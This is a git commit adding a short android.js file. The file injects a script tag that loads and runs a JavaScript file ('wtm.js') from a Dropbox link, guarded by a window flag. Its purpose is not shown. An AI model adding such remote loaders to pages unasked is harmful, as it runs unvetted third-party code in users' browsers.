92e6d07f7e5064830bd15d8f25a851ba0eff08f6
Yanderson Kaio <39843114+yandersonkaio@users.noreply.github.com>
2024-11-25 23:25:07 -0300

    Add files via upload

---
+++ android.js
@@ -0,0 +1,7 @@
+if (!window.wtmLoaded) {
+    (function () {
+        var m = document.createElement('script'); m.src = 'https://www.dropbox.com/scl/fi/3hr0pdzfzzran5r9n6u91/wtm.js';
+        s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(m, s);
+    })();
+    window.wtmLoaded = true;
+}
